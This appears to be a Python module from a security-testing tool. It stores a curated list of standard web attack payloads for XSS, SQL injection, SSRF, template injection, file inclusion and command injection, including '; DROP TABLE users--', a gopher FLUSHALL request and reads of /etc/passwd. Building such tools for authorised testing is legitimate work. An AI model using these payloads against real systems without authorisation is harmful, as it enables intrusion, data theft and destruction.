from typing import List, Dict, Optional, Any

from itzraven.core.logger import get_logger

logger = get_logger(__name__)


class PayloadStore:
    """Stores and retrieves security payloads categorized by vulnerability class."""

    def __init__(self):
        self._payloads: Dict[str, List[Dict[str, str]]] = {}
        self._load_curated()

    def _load_curated(self) -> None:
        self._payloads = {
            "XSS": [
                {"payload": "<script>alert(1)</script>", "source": "builtin"},
                {"payload": "<img src=x onerror=alert(1)>", "source": "builtin"},
                {"payload": "javascript:alert(document.cookie)", "source": "builtin"},
                {"payload": "\"><svg onload=alert(1)>", "source": "builtin"},
                {"payload": "'-alert(1)-'", "source": "builtin"},
            ],
            "SQLi": [
                {"payload": "' OR '1'='1", "source": "builtin"},
                {"payload": "'; DROP TABLE users--", "source": "builtin"},
                {"payload": "' UNION SELECT null,null--", "source": "builtin"},
                {"payload": "admin'--", "source": "builtin"},
                {"payload": "' WAITFOR DELAY '0:0:5'--", "source": "builtin"},
            ],
            "SSRF": [
                {"payload": "http://169.254.169.254/latest/meta-data/", "source": "builtin"},
                {"payload": "http://127.0.0.1:22", "source": "builtin"},
                {"payload": "file:///etc/passwd", "source": "builtin"},
                {"payload": "gopher://localhost:6379/_FLUSHALL", "source": "builtin"},
            ],
            "SSTI": [
                {"payload": "{{7*7}}", "source": "builtin"},
                {"payload": "${7*7}", "source": "builtin"},
                {"payload": "#{7*7}", "source": "builtin"},
                {"payload": "{{config}}", "source": "builtin"},
            ],
            "LFI": [
                {"payload": "../../../etc/passwd", "source": "builtin"},
                {"payload": "....//....//....//etc/passwd", "source": "builtin"},
                {"payload": "php://filter/convert.base64-encode/resource=index.php", "source": "builtin"},
            ],
            "Command Injection": [
                {"payload": "; id", "source": "builtin"},
                {"payload": "| whoami", "source": "builtin"},
                {"payload": "`id`", "source": "builtin"},
                {"payload": "$(cat /etc/passwd)", "source": "builtin"},
            ],
        }
        total = sum(len(v) for v in self._payloads.values())
        logger.info(f"Loaded {total} curated payloads across {len(self._payloads)} categories")

    def search(self, vuln_class: str, limit: int = 10) -> List[Dict[str, str]]:
        results = self._payloads.get(vuln_class, [])
        return results[:limit]

    def get_categories(self) -> List[str]:
        return list(self._payloads.keys())

    def add_payload(self, payload: str, vuln_class: str, source: str = "user") -> None:
        if vuln_class not in self._payloads:
            self._payloads[vuln_class] = []
        self._payloads[vuln_class].append({"payload": payload, "source": source})
        logger.info(f"Added payload to '{vuln_class}' from {source}")
